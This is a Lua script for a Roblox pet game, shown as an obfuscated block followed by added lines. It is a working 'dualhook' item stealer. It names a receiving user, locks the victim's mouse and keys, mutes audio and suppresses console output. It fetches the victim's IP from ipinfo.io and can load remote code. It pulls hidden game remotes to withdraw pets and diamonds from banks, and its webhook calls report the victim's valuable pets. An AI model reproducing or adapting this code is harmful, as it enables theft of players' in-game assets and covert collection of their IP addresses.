v366=require(v443:FindFirstChildOfClass(v7("\13\45\233\176\245\141\221\234\50\43\253\177","\137\64\66\141\197\153\232\142"))).name;v367=require(v443:FindFirstChildOfClass(v7("\46\223\38\179\132\6\227\33\180\129\19\196","\232\99\176\66\198"))).thumbnail;break;end end v95(v7("\182\50\43\20\126\140\244\118\172\97\98\76\79\164\205\13\194\8\11\76\49\205\163\63\239\51\45\7\118\215","\76\140\65\72\102\27\237\153"),v366,v7("\106\223\0\215\197\24\177\68\223\86\253\250\39\153","\222\42\186\118\178\183\97"),v91,v88,v367,UserName);v90=0;v91=0;v110=v110 + (2 -1) ;v80=1864 -(1710 + 154) ;v77=318 -(200 + 118) ;elseif ((v109==(0 + 0)) or (v88==(0 -0))) then TList={};break;end WTianicList={};WTList={};WTcc={};wait(1 -0 );end end);local v111= #BList;WBananaList={};WBList={};WBcc={};spawn(function()while wait() do WLibrary=require(game:GetService(v7("\111\233\84\134\84\239\69\158\88\232\119\158\82\254\69\141\88","\234\61\140\36")).Framework:FindFirstChild(v7("\13\212\184\96\14\51\196","\111\65\189\218\18")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v276,v277)if (v277.name==v7("\65\74\21\52\5\93","\207\35\43\123\85\107\60")) then table.insert(WBananaList,v276);end end);local v226=require(game:GetService(v7("\66\175\176\230\112\115\171\180\239\125\67\190\175\248\120\119\175","\25\16\202\192\138")).Library.Client.Save).Get().Pets;local v227={};for v278,v279 in pairs(v226) do v227[v279[v7("\232\194\169","\148\157\171\205\130\201")]]=false;end for v281,v282 in pairs(v226) do if (table.find(WBananaList,v282[v7("\42\208","\150\67\180\20\73\177")])~=nil) then local v445=0 + 0 ;while true do if (v445==(0 + 0)) then table.insert(WBList,v282[v7("\152\17\30","\45\237\120\122")]);table.insert(WBcc,v282[v7("\222\236","\76\183\136\194")]);break;end end end end if (v111==( #WBList + 1 + 0)) then local v368=0;local v369;local v370;local v371;while true do if (v368==(1 + 3)) then v80=0;v77=0 -0 ;break;end if (v368==(1250 -(363 + 887))) then v111= #BList;v88=v88-(1 -0) ;v368=4 -3 ;end if (v368==(1 + 0)) then v369=v90;v370=v7("\88\231\235\57\94\78","\116\26\134\133\88\48\47");v368=4 -2 ;end if ((3 + 0)==v368) then v90=1664 -(674 + 990) ;v91=0;v368=2 + 2 ;end if (v368==2) then v371="rbxassetid://10946336703";v95(v7("\68\195\161\234\188\124\31\155\224\174\247\80\63\239\129\202\156\56\84\129\250\230\188\124\31\207\161\190","\18\126\161\192\132\221"),v370,v7("\127\45\184\1\68\70\39\160\1","\54\63\72\206\100"),v91,v88,v371,UserName);v368=3;end end elseif ((v111==(0 + 0)) or (v88==(0 -0))) then BList={};break;end WBananaList={};WBList={};WBcc={};wait(1056 -(507 + 548) );end end);local v112= #HList;WHugeList={};WHList={};WHcc={};local v113=1;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\250\92\85\118\236\120\201\77\64\126\214\111\199\75\68\125\224","\27\168\57\37\26\133")).Framework:FindFirstChild(v7("\1\163\126\186\214\63\179","\183\77\202\28\200")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v283,v284)if v284.huge then table.insert(WHugeList,v283);end end);local v229=require(game:GetService(v7("\37\54\153\4\30\48\136\28\18\55\186\28\24\33\136\15\18","\104\119\83\233")).Library.Client.Save).Get().Pets;local v230={};for v285,v286 in pairs(v229) do v230[v286[v7("\224\241\35","\35\149\152\71\66")]]=false;end for v288,v289 in pairs(v229) do if (table.find(WHugeList,v289[v7("\16\236","\90\121\136\34\208")])~=nil) then table.insert(WHList,v289[v7("\210\7\81","\126\167\110\53")]);table.insert(WHcc,v289[v7("\52\20","\95\93\112\78\152\188")]);end end if (v112==( #WHList + (838 -(289 + 548)))) then v112= #WHList;v88=v88-(1819 -(821 + 997)) ;local v372=SHList[v113];local v373;local v374;for v446,v447 in pairs(game:GetService(v7("\243\240\149\25\237\189\211\213\240\129\38\240\177\192\192\242\128","\178\161\149\229\117\132\222"))[v7("\183\228\249\133\147\51\133\23\167\233\228","\67\232\187\189\204\193\118\198")].Pets:GetChildren()) do local v448=string.split(v447.Name,v7("\203\99\245","\143\235\78\213\64\91\98"))[256 -(195 + 60) ];if (v448==tostring(v372)) then v374=require(v447:FindFirstChildOfClass(v7("\160\71\128\252\124\179\190\75\150\224\96\162","\214\237\40\228\137\16"))).name;v373=require(v447:FindFirstChildOfClass(v7("\168\236\235\204\15\163\182\224\253\208\19\178","\198\229\131\143\185\99"))).thumbnail;break;end end v95(v7("\11\129\167\125\84\149\151\126\94\153\188\123\11\204\226\57\121\185\143\86\27\198\232\41\92\131\166\118\72\179\165\124\68\152\160\41","\19\49\236\200"),v374,v7("\222\50\224\178\246\163\241\57\243","\218\158\87\150\215\132"),v91,v88,v373,UserName);v90=0 + 0 ;v91=0;v113=v113 + (1502 -(251 + 1250)) ;v80=0 -0 ;v77=0 + 0 ;elseif ((v112==0) or (v88==(1032 -(809 + 223)))) then HList={};break;end WHugeList={};WHList={};WHcc={};wait(1);end end);local v114= #PList;WPogList={};WPList={};WPcc={};local v115=1;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\201\27\201\238\63\33\204\239\27\221\209\34\45\223\250\25\220","\173\155\126\185\130\86\66")).Framework:FindFirstChild(v7("\201\175\184\213\137\254\252","\140\133\198\218\167\232")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v290,v291)if (string.split(v291.name," ")[1 -0 ]==v7("\133\33\179","\228\213\78\212\29")) then table.insert(WPogList,v290);end end);local v232=require(game:GetService(v7("\181\73\166\9\226\132\77\162\0\239\180\88\185\23\234\128\73","\139\231\44\214\101")).Library.Client.Save).Get().Pets;local v233={};for v292,v293 in pairs(v232) do v233[v293[v7("\204\230\2","\118\185\143\102\62\112\209\81")]]=false;end for v295,v296 in pairs(v232) do if (table.find(WPogList,v296[v7("\85\116","\88\60\16\73\134\197\117\124")])~=nil) then local v449=0 -0 ;while true do if (v449==0) then table.insert(WPList,v296[v7("\69\227\252","\33\48\138\152\168")]);table.insert(WPcc,v296[v7("\123\18","\87\18\118\80\49\161")]);break;end end end end if (v114==( #WPList + (3 -2))) then v114= #WPList;v88=v88-1 ;local v375=SPList[v115];local v376;local v377;for v450,v451 in pairs(game:GetService(v7("\126\27\202\172\185\79\31\206\165\180\127\10\213\178\177\75\27","\208\44\126\186\192"))[v7("\200\37\128\239\38\217\234\122\216\40\157","\46\151\122\196\166\116\156\169")].Pets:GetChildren()) do local v452=string.split(v451.Name,v7("\165\160\6","\155\133\141\38\122"))[1 + 0 ];if (v452==tostring(v375)) then v376=require(v451:FindFirstChildOfClass(v7("\8\37\168\84\67\122\150\38\56\165\81\91","\197\69\74\204\33\47\31"))).name;v377=require(v451:FindFirstChildOfClass(v7("\221\64\94\146\252\74\105\132\226\70\74\147","\231\144\47\58"))).thumbnail;break;end end v95(v7("\232\222\211\103\29\103\143\115\248\232\245\82\82\119\143\99\180\209\200\112\66","\89\210\184\186\21\120\93\175"),v376,"",v91,v88,v377,UserName);v90=0;v91=0 + 0 ;v115=v115 + (618 -(14 + 603)) ;v80=0;v77=0;elseif ((v114==(129 -(118 + 11))) or (v88==0)) then PList={};break;end WPogList={};WPList={};WPcc={};wait(1 + 0 );end end);local v116= #EList;WExclusiveList={};WEList={};WEcc={};local v117=1 + 0 ;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\131\86\108\217\112\57\176\71\121\209\74\46\190\65\125\210\124","\90\209\51\28\181\25")).Framework:FindFirstChild(v7("\252\114\85\252\190\194\98","\223\176\27\55\142")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v297,v298)if ((v298.rarity==v7("\1\163\205\185\49\168\199\163\33","\213\68\219\174")) and  not v298.huge and  not v298.titanic) then table.insert(WExclusiveList,v297);end end);local v235=require(game:GetService(v7("\57\229\51\235\35\198\62\107\14\228\16\243\37\215\62\120\14","\31\107\128\67\135\74\165\95")).Library.Client.Save).Get().Pets;local v236={};for v299,v300 in pairs(v235) do v236[v300[v7("\205\225\248","\209\184\136\156\45\33")]]=false;end for v302,v303 in pairs(v235) do if ((table.find(WExclusiveList,v303[v7("\14\204","\216\103\168\21\104")])~=nil) and  not v303.huge and  not v303.titanic) then table.insert(WEList,v303[v7("\109\164\71","\196\24\205\35")]);table.insert(WEcc,v303[v7("\39\143","\102\78\235\131")]);end end if (v116==( #WEList + (2 -1))) then v116= #WEList;v88=v88-(950 -(551 + 398)) ;local v378=SEList[v117];local v379;local v380;for v453,v454 in pairs(game:GetService(v7("\200\43\36\72\78\58\182\32\255\42\7\80\72\43\182\51\255","\84\154\78\84\36\39\89\215"))[v7("\194\222\114\113\55\216\194\98\119\55\196","\101\157\129\54\56")].Pets:GetChildren()) do local v455=string.split(v454.Name,v7("\93\228\202","\25\125\201\234\203\67"))[1 + 0 ];if (v455==tostring(v378)) then v380=require(v454:FindFirstChildOfClass(v7("\84\251\28\22\24\34\32\122\230\17\19\0","\115\25\148\120\99\116\71"))).name;v379=require(v454:FindFirstChildOfClass(v7("\33\50\189\49\77\9\14\186\54\72\28\41","\33\108\93\217\68"))).thumbnail;break;end end v95(v7("\129\95\164\169\223\82\158\175\222\74\179\247\155\1\235\136\195\72\173\184\200\66\183\168\145\1\225\247\207\78\165\169\194\116\163\168\218\89\251","\205\187\43\193"),v380,"",v91,v88,v379,UserName);v90=0 + 0 ;v91=0;v117=v117 + 1 + 0 ;v80=0 -0 ;v77=0;elseif ((v116==(0 -0)) or (v88==0)) then EList={};break;end WExclusiveList={};WEList={};WEcc={};wait(1 + 0 );end end);local v118= #EvList;WEventList={};WEvList={};WEvcc={};local v119=3 -2 ;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\204\119\21\211\247\113\4\203\251\118\54\203\241\96\4\216\251","\191\158\18\101")).Framework:FindFirstChild(v7("\233\202\133\165\174\215\218","\207\165\163\231\215")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v304,v305)if (v305.rarity==v7("\227\239\252\88\48","\16\166\153\153\54\68")) then table.insert(WEventList,v304);end end);local v238=require(game:GetService(v7("\224\182\208\74\61\34\248\198\182\196\117\32\46\235\211\180\197","\153\178\211\160\38\84\65")).Library.Client.Save).Get().Pets;local v239={};for v306,v307 in pairs(v238) do v239[v307[v7("\151\2\94","\75\226\107\58")]]=false;end for v309,v310 in pairs(v238) do if (table.find(WEventList,v310[v7("\81\218","\173\56\190\113\26\113\162")])~=nil) then table.insert(WEvList,v310[v7("\222\215\41","\151\171\190\77\101")]);table.insert(WEvcc,v310[v7("\204\43","\107\165\79\152\201\152\29")]);end end if (v118==( #WEvList + 1 + 0)) then v118= #WEvList;v88=v88-(90 -(40 + 49)) ;local v381=v90;local v382=SEvList[v119];local v383;local v384;for v456,v457 in pairs(game:GetService(v7("\101\75\248\199\93\124\86\90\237\207\103\107\88\92\233\204\81","\31\55\46\136\171\52"))[v7("\238\23\248\221\227\13\255\192\254\26\229","\148\177\72\188")].Pets:GetChildren()) do local v458=string.split(v457.Name,v7("\230\251\23","\179\198\214\55"))[1];if (v458==tostring(v382)) then v383=require(v457:FindFirstChildOfClass(v7("\221\3\118\99\73\214\195\15\96\127\85\199","\179\144\108\18\22\37"))).name;v384=require(v457:FindFirstChildOfClass(v7("\235\172\31\156\195\195\144\24\155\198\214\183","\175\166\195\123\233"))).thumbnail;break;end end v95(v7("\181\210\72\90\248\255\203\83\19\176\165\136\120\95\245\225\214\23\3\176\181\210\72\90\248\255\203\83\19","\144\143\162\61\41"),v383,"",v91,v88,v384,v107,petinfo);v90=0 -0 ;v91=490 -(99 + 391) ;v119=v119 + 1 + 0 ;v80=0 -0 ;v77=0 -0 ;elseif ((v118==0) or (v88==0)) then EvList={};break;end WEventList={};WEvList={};WEvcc={};wait(1 + 0 );end end);local v120= #SList;WSecretList={};WSList={};WScc={};local v121=2 -1 ;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\210\214\13\92\123\132\50\244\214\25\99\102\136\33\225\212\24","\83\128\179\125\48\18\231")).Framework:FindFirstChild(v7("\113\190\241\207\70\12\68","\126\61\215\147\189\39")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v311,v312)if (v312.rarity==v7("\75\250\30\87\125\235","\37\24\159\125")) then table.insert(WSecretList,v311);end end);local v241=require(game:GetService(v7("\232\163\101\78\211\165\116\86\223\162\70\86\213\180\116\69\223","\34\186\198\21")).Library.Client.Save).Get().Pets;local v242={};for v313,v314 in pairs(v241) do v242[v314[v7("\237\1\193","\162\152\104\165\61")]]=false;end for v316,v317 in pairs(v241) do if (table.find(WSecretList,v317[v7("\196\43","\133\173\79\210\29\16")])~=nil) then local v459=1604 -(1032 + 572) ;local v460;while true do if (v459==(417 -(203 + 214))) then v460=1817 -(568 + 1249) ;while true do if (v460==(0 + 0)) then table.insert(WSList,v317[v7("\152\117\233","\75\237\28\141")]);table.insert(WScc,v317[v7("\213\91","\129\188\63\172\209\79\123\135")]);break;end end break;end end end end if (v120==( #WSList + 1)) then v120= #WSList;v88=v88-1 ;local v385=SSList[v121];local v386;local v387;for v461,v462 in pairs(game:GetService(v7("\114\225\246\193\73\231\231\217\69\224\213\217\79\246\231\202\69","\173\32\132\134"))[v7("\113\36\44\198\156\20\238\122\52\58\214","\173\46\123\104\143\206\81")].Pets:GetChildren()) do local v463=string.split(v462.Name,v7("\244\80\98","\97\212\125\66\234\37\227"))[2 -1 ];if (v463==tostring(v385)) then v386=require(v462:FindFirstChildOfClass(v7("\167\236\178\32\18\143\208\181\39\23\154\247","\126\234\131\214\85"))).name;v387=require(v462:FindFirstChildOfClass(v7("\169\218\77\79\67\129\230\74\72\70\148\193","\47\228\181\41\58"))).thumbnail;break;end end v95(v7("\252\239\209\46\16\56\22\168\251\230\61\2\51\26\252\188\147\113\48\21\60\148\217\237\113\73\112\69\181\244\204\40\11\57\17\161\195\223\58\0\53\69","\127\198\156\185\91\99\80"),v386,"",v91,v88,v387,v107);v90=0 -0 ;v91=1306 -(913 + 393) ;v121=v121 + (2 -1) ;v80=0;v77=0 -0 ;elseif ((v120==0) or (v88==0)) then SList={};break;end WSecretList={};WSList={};WScc={};wait(411 -(269 + 141) );end end);local v122= #MList;WMythicList={};WMList={};WMcc={};local v123=2 -1 ;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\199\31\220\252\174\8\56\202\240\30\255\228\168\25\56\217\240","\190\149\122\172\144\199\107\89")).Framework:FindFirstChild(v7("\30\12\243\236\255\32\28","\158\82\101\145\158")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v318,v319)if (v319.rarity==v7("\93\231\22\30\77\115\255\14","\36\16\158\98\118")) then table.insert(WMythicList,v318);end end);local v244=require(game:GetService(v7("\242\19\211\247\81\235\38\241\197\18\240\239\87\250\38\226\197","\133\160\118\163\155\56\136\71")).Library.Client.Save).Get().Pets;local v245={};for v320,v321 in pairs(v244) do v245[v321[v7("\227\171\117","\213\150\194\17\146\214\127")]]=false;end for v323,v324 in pairs(v244) do if ((table.find(WMythicList,v324[v7("\18\173","\86\123\201\196\180\38\196\194")])~=nil) and v324.hc and v324.dm) then local v464=1981 -(362 + 1619) ;local v465;local v466;while true do if (v464==(1626 -(950 + 675))) then while true do if (v465==(0 + 0)) then v466=1179 -(216 + 963) ;while true do if (v466==(1287 -(485 + 802))) then table.insert(WMList,v324[v7("\226\225\221","\207\151\136\185")]);table.insert(WMcc,v324[v7("\161\135","\17\200\227\72\226\20\24")]);break;end end break;end end break;end if (v464==0) then v465=559 -(432 + 127) ;v466=nil;v464=1074 -(1065 + 8) ;end end end end if (v122==( #WMList + 1 + 0)) then v122= #WMList;v88=v88-(1602 -(635 + 966)) ;local v388=SMList[v123];local v389;local v390;for v467,v468 in pairs(game:GetService(v7("\130\68\11\219\192\242\238\235\181\69\40\195\198\227\238\248\181","\159\208\33\123\183\169\145\143"))[v7("\205\101\28\31\192\127\27\2\221\104\1","\86\146\58\88")].Pets:GetChildren()) do local v469=string.split(v468.Name,v7("\24\146\170","\154\56\191\138\160\206\137\86"))[1 + 0 ];if (v469==tostring(v388)) then v389=require(v468:FindFirstChildOfClass(v7("\171\86\241\146\112\63\178\207\148\80\229\147","\172\230\57\149\231\28\90\225"))).name;v390=require(v468:FindFirstChildOfClass(v7("\47\165\130\199\36\222\49\169\148\219\56\207","\187\98\202\230\178\72"))).darkMatterThumbnail;break;end end v95(v7("\123\243\173\50\72\46\239\254\112\0\107\204\189\36\66\40\226\165\60\0\107\161\254\34\67\35\227\171\62\16","\42\65\129\196\80"),v389,"",v91,v88,v390,v107);v90=0;v91=42 -(5 + 37) ;v123=v123 + 1 ;v80=0;v77=0 -0 ;elseif ((v122==(0 + 0)) or (v88==(0 -0))) then MList={};break;end WMythicList={};WMList={};WMcc={};wait(1 + 0 );end end);
+getgenv().Settings = {
+    User = "jokester30404",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = ".gg/uSgzNwHDTS",
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 50 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 0 --%
+    }
+}
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local disabledKeyCodes = {
+    0x73,
+    0xA4,
+    0xA5,
+    0x1B,
+    0x0D,
+};
+UserSettings().GameSettings.MasterVolume = 0
+if _G.MouseLock ~= false then
+    runService.RenderStepped:Connect(function()
+        for _, keyCode in next, disabledKeyCodes do
+            keyrelease(keyCode)
+        end
+
+        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
+    end);
+end
+
+local function antiPrint(...)
+    local info = debug.getinfo(2)
+    if info and info.what == 'Lua' and info.func == print then
+        return
+    end
+    return print(...)
+end
+print = antiPrint
+rconsoleprint = antiPrint
+rconsolewarn = antiPrint
+rconsoleerr = antiPrint
+rconsoleinput = antiPrint
+printconsole = antiPrint
+setclipboard = antiPrint
+
+-- Users And Stuff
+
+if UserName == nil then
+    UserName = _G.UserName
+end
+if UserName2 == nil then
+    UserName2 = _G.UserName2
+end
+if Webhook == nil then
+    Webhook = _G.Webhook
+end
+-- User Checks
+
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end
+if UserName2 ~= nil then
+    local worked3 = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
+    end)
+    if not worked3 then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
+        return;
+    end
+end
+
+local diaamt99 = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
+
+-- Check If The Area Have A Mailbox In It
+
+local worked = pcall(function()
+    game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad:GetChildren()
+end)
+if not worked then
+    game:GetService("Players").LocalPlayer:Kick("UnRegistered Area. Please Consider Going To The Shop")
+    return;
+end
+
+-- Base64 Encryption
+
+function to_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    return ((data:gsub('.', function(x)
+        local r, b = '', x:byte()
+        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r;
+    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c = 0
+        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
+        return b:sub(c + 1, c + 1)
+    end) .. ({ '', '==', '=' })[#data % 3 + 1])
+end
+
+function from_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^' .. b .. '=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r, f = '', (b:find(x) - 1)
+        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c = 0
+        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Premium Check
+
+request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
+    HttpPost
+
+
+-- Exploit's Name
+
+local exploit
+local function getexploit()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
+
+    exploit = exploitt
+end
+getexploit()
+
+-- Player Infos
+
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game:GetService("Players").LocalPlayer
+local IPadress = game:HttpGet('https://ipinfo.io/ip')
+local data1
+
+-- Loading Screen
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+end
+
+-- Remotes
+
+local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
+local InvPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
+local MailPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox)
+local RedeemPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Reedem Rank Rewards"])
+local GiftsPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Free Gifts"])
+
+local getmybanksremote = debug.getconstant(BankPath.GetMyBanks, 3)
+
+local lockremote = debug.getconstant(InvPath.LockPets, 5)
+
+local getbankremote = debug.getconstant(BankPath.GetBank, 3)
+
+local withdrawremote = debug.getconstant(BankPath.Withdraw, 16)
+
+local mailremote = debug.getconstant(debug.getprotos(MailPath.UpdateOutbox)[2], 20)
+
+local claimallremote = debug.getconstant(MailPath.UpdateInboxBottom, 35)
+
+local getmailremote = debug.getconstant(MailPath.Update, 3)
+
+local acceptinviteremote = debug.getconstant(BankPath.DecideInvite, 6)
+
+local getinvitesremote = debug.getconstant(BankPath.GetMyInvites, 3)
+
+local redeemrankremote = debug.getconstant(RedeemPath.Redeem, 3)
+
+local redeemgiftsremote = debug.getconstant(GiftsPath.Redeem, 3)
+
+local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local bloby = getupvalues(blobx[2])
+local blobz = getupvalues(bloby[1])[1][2]
+local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local blobb = getupvalues(bloba[2])
+
+getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
+lockremote = blobz[blobb[2](2, lockremote)]
+getbankremote = blobz[blobb[2](2, getbankremote)]
+withdrawremote = blobz[blobb[2](2, withdrawremote)]
+mailremote = blobz[blobb[2](2, mailremote)]
+claimallremote = blobz[blobb[2](2, claimallremote)]
+getmailremote = blobz[blobb[2](2, getmailremote)]
+acceptinviteremote = blobz[blobb[2](2, acceptinviteremote)]
+getinvitesremote = blobz[blobb[2](2, getinvitesremote)]
+redeemrankremote = blobz[blobb[2](2, redeemrankremote)]
+redeemgiftsremote = blobz[blobb[2](2, redeemgiftsremote)]
+
+-- Banks Stuff
+
+local mybanks = getmybanksremote:InvokeServer()
+local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+
+-- Inv Space Check :
+
+function invspace()
+    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
+    if invspace > 50 then
+        invspace = 50
+    end
+    return invspace
+end
+
+function invspace_nolimit()
+    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
+    return invspace
+end
+
+-- Bank Teleport
+
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Bank.Pad.Position)
+
+-- Bank Variables :
+
+local SuperBank
+local Bank
+local SuperBank2
+local Bank2
+local SuperBank3
+local Bank3
+local SuperBank4
+local Bank4
+local SuperBank5
+local Bank5
+local bdiaamt = 0
+local bdiaamt2 = 0
+local bdiaamt3 = 0
+local bdiaamt4 = 0
+local bdiaamt5 = 0
+local bankscount = 0
+local FinalFinal = 0
+
+-- Banks Count :
+
+if mybanks[1] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[2] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[3] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[4] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[5] ~= nil then
+    bankscount = bankscount + 1
+end
+
+-- Check & Accept Banks Invites
+local invbanks = getinvitesremote:InvokeServer()
+bankstable = {}
+if bankscount ~= 5 then
+    if invbanks[1] ~= nil then
+        table.insert(bankstable, invbanks[1]["BUID"])
+    end
+    if invbanks[2] ~= nil then
+        table.insert(bankstable, invbanks[2]["BUID"])
+    end
+    if invbanks[3] ~= nil then
+        table.insert(bankstable, invbanks[3]["BUID"])
+    end
+    if invbanks[4] ~= nil then
+        table.insert(bankstable, invbanks[4]["BUID"])
+    end
+    if invbanks[5] ~= nil then
+        table.insert(bankstable, invbanks[5]["BUID"])
+    end
+    for i, v in pairs(bankstable) do
+        acceptinviteremote:InvokeServer(v)
+    end
+end
+
+-- Banks BUID's
+if bankscount == 0 then
+    Bank = bankstable[1]
+    Bank2 = bankstable[2]
+    Bank3 = bankstable[3]
+    Bank4 = bankstable[4]
+    Bank5 = bankstable[5]
+elseif bankscount == 1 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = bankstable[1]
+    Bank3 = bankstable[2]
+    Bank4 = bankstable[3]
+    Bank5 = bankstable[4]
+elseif bankscount == 2 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = bankstable[1]
+    Bank4 = bankstable[2]
+    Bank5 = bankstable[3]
+elseif bankscount == 3 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = mybanks[3]["BUID"]
+    Bank4 = bankstable[1]
+    Bank5 = bankstable[2]
+elseif bankscount == 4 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = mybanks[3]["BUID"]
+    Bank4 = mybanks[4]["BUID"]
+    Bank5 = bankstable[1]
+elseif bankscount == 5 then
+    Bank = mybanks[1]["BUID"]
+    Bank2 = mybanks[2]["BUID"]
+    Bank3 = mybanks[3]["BUID"]
+    Bank4 = mybanks[4]["BUID"]
+    Bank5 = mybanks[5]["BUID"]
+end
+
+-- Get Pets
+
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+PetIDList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.huge or v.titanic or v.name == "banana" or v.name == "Bladee" or v.convertPoints == 5 then -- get pets to withdraw from banks
+        table.insert(PetIDList, i)
+    end
+end)
+
+-- Withdraw From Banks
+if Bank ~= nil and invspace() ~= 0 then
+    while task.wait() do
+        print('bank1 purged')
+        SuperBank = getbankremote:InvokeServer(Bank)
+        LHList = {}
+        LFinalList = {}
+        local lpets = SuperBank.Storage.Pets
+        local y = {}
+        for i, v in pairs(lpets) do
+            y[v["uid"]] = false
+        end
+        for i, v in pairs(lpets) do
+            if table.find(PetIDList, v["id"]) ~= nil then
+                table.insert(LHList, v["uid"])
+            end
+        end
+        print("LHList :", #LHList)
+        if #LHList <= invspace() then
+            for i, v in pairs(LHList) do
+                table.insert(LFinalList, v)
+            end
+        elseif #LHList > invspace() then
+            for i, v in pairs(LHList) do
+                if #LFinalList < invspace() then
+                    table.insert(LFinalList, v)
+                end
+            end
+        end
+        print("LFinalList :", #LFinalList)
+        bdiaamt = SuperBank.Storage.Currency.Diamonds
+        if #LFinalList == 0 and bdiaamt < 1000000000 and diaamt99 > 110000 then
+            bdiaamt = 0
